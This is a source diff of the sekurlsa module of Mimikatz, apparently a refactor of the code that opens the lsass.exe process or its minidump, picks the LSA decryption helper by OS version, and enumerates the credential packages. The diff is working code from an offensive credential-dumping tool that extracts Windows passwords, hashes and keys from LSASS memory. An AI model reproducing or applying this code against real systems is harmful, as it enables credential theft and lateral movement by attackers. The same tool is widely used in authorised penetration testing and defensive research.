@@ -69,12 +69,9 @@ const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
 	{kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
 #endif
 	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
-#if defined(LSASS_DECRYPT)
-	{kuhl_m_sekurlsa_nt63_init,	kuhl_m_sekurlsa_nt63_clean,	kuhl_m_sekurlsa_nt63_acquireKeys,	&kuhl_m_sekurlsa_nt63_pLsaProtectMemory,&kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory},
-#endif
 };
 
-const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
+const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper = NULL;
 KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}};
 wchar_t * pMinidumpName = NULL;
 
@@ -83,8 +80,12 @@ VOID kuhl_m_sekurlsa_reset()
 	HANDLE toClose;
 	ULONG i;
 	
-	free(pMinidumpName);
-	pMinidumpName = NULL;
+	if(pMinidumpName)
+	{
+		free(pMinidumpName);
+		pMinidumpName = NULL;
+	}
+
 	if(cLsass.hLsassMem)
 	{
 		switch(cLsass.hLsassMem->type)
@@ -100,6 +101,7 @@ VOID kuhl_m_sekurlsa_reset()
 		}
 		cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
 		CloseHandle(toClose);
+		kuhl_m_sekurlsa_clean();
 	}
 	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
 		RtlZeroMemory(&lsassPackages[i]->Module, sizeof(KUHL_M_SEKURLSA_LIB));
@@ -127,24 +129,19 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 }
 NTSTATUS kuhl_m_sekurlsa_init()
 {
-	lsassLocalHelper =
-	#if defined(_M_ARM64)
-		&lsassLocalHelpers[0]
-	#else
-		(MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
-		#if defined(LSASS_DECRYPT)
-			((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
-		#else
-			&lsassLocalHelpers[1]
-		#endif
-	#endif
-		;
+	lsassLocalHelper = NULL;
 	return STATUS_SUCCESS;
 }
 
 NTSTATUS kuhl_m_sekurlsa_clean()
 {
-	return lsassLocalHelper->cleanLocalLib();
+	NTSTATUS status = STATUS_SUCCESS;
+	if(lsassLocalHelper)
+	{
+		status = lsassLocalHelper->cleanLocalLib();
+		lsassLocalHelper = NULL;
+	}
+	return status;
 }
 
 NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
@@ -165,71 +162,75 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	if(!cLsass.hLsassMem)
 	{
 		status = STATUS_NOT_FOUND;
-		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
+		if(pMinidumpName)
 		{
-			if(pMinidumpName)
-			{
-				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
-				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
-				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-			}
-			else
-			{
-				Type = KULL_M_MEMORY_TYPE_PROCESS;
-				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
-					hData = OpenProcess(processRights, FALSE, pid);
-				else PRINT_ERROR(L"LSASS process not found (?)\n");
-			}
+			Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
+			kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
+			hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+		}
+		else
+		{
+			Type = KULL_M_MEMORY_TYPE_PROCESS;
+			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+				hData = OpenProcess(processRights, FALSE, pid);
+			else PRINT_ERROR(L"LSASS process not found (?)\n");
+		}
 
-			if(hData && hData != INVALID_HANDLE_VALUE)
+		if(hData && hData != INVALID_HANDLE_VALUE)
+		{
+			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
 			{
-				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
+				if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
 				{
-					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
+					if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
 					{
-						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
-						{
-							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
-							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
-							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
-
-							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
-								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
-						#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
-								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
-						#elif defined(_M_IX86)
-							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
-								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
-						#endif
-						}
-						else
-						{
-							isError = TRUE;
-							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
-						}
+						cLsass.osContext.MajorVersion = pInfos->MajorVersion;
+						cLsass.osContext.MinorVersion = pInfos->MinorVersion;
+						cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
+					#if defined(_M_X64) || defined(_M_ARM64)
+						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
+							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
+					#elif defined(_M_IX86)
+						if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
+							PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
+					#endif
 					}
 					else
 					{
-					#if defined(_M_IX86)
-						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
-							PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
-						else
-					#endif
-						{						
-							cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
-							cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-							cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
-						}
+						isError = TRUE;
+						PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
 					}
-					
-					if(!isError)
-					{
-						#if !defined(_M_ARM64)
-						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
-						#endif
-						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
+				}
+				else
+				{
+				#if defined(_M_IX86)
+					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
+						PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+					else
+				#endif
+					{						
+						cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
+						cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
+						cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+					}
+				}
 
+				if(!isError)
+				{
+					lsassLocalHelper = 
+					#if defined(_M_ARM64)
+						&lsassLocalHelpers[0]
+					#else
+						(cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1]
+					#endif
+					;
+
+					if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
+					{
+					#if !defined(_M_ARM64)
+						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
+					#endif
+						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
 						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
 						{
 							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
@@ -243,18 +244,18 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 						}
 						else PRINT_ERROR(L"Modules informations\n");
 					}
+					else PRINT_ERROR(L"Local LSA library failed\n");
 				}
-				else PRINT_ERROR(L"Memory opening\n");
 			}
-			else PRINT_ERROR_AUTO(L"Handle on memory");
+			else PRINT_ERROR(L"Memory opening\n");
 
 			if(!NT_SUCCESS(status))
-			{
-				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
 				CloseHandle(hData);
-			}
 		}
-		else PRINT_ERROR(L"Local LSA library failed\n");
+		else PRINT_ERROR_AUTO(L"Handle on memory");
+
+		if(!NT_SUCCESS(status))
+			cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
 	}
 	return status;
 }
